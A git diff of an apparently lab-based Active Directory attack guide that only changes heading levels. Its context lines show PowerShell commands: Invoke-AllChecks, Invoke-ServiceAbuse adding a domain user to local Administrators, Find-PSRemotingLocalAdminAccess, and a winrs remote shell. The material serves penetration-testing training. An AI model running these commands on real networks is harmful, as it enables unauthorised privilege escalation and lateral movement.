@@ -37,7 +37,7 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
 
 First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.
 
-### Check for any priviliege escalation path
+#### Check for any priviliege escalation path
 ```bash
 Invoke-AllChecks
 ```
@@ -47,7 +47,7 @@ _Invoke-AllChecks_
 
 Let’s use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group. 
 
-### Abuse the service and add our current domain user to the local Administrator group
+#### Abuse the service and add our current domain user to the local Administrator group
 ```bash
 Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
@@ -62,7 +62,7 @@ Now, our user is a local admin !
 
 Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 
 
-### Identify a computer within the network domain where the current user has local admin privileges.
+#### Identify a computer within the network domain where the current user has local admin privileges.
 ```bash
 Find-PSRemotingLocalAdminAccess
 ```
@@ -70,7 +70,7 @@ Find-PSRemotingLocalAdminAccess
 We can connect to the machine who has the local administrative access by using winrs
 
 
-### Checking the username and computername in the remote winrs session
+#### Checking the username and computername in the remote winrs session
 ```bash
 winrs -r:dcorp-adminsrv cmd
 set username
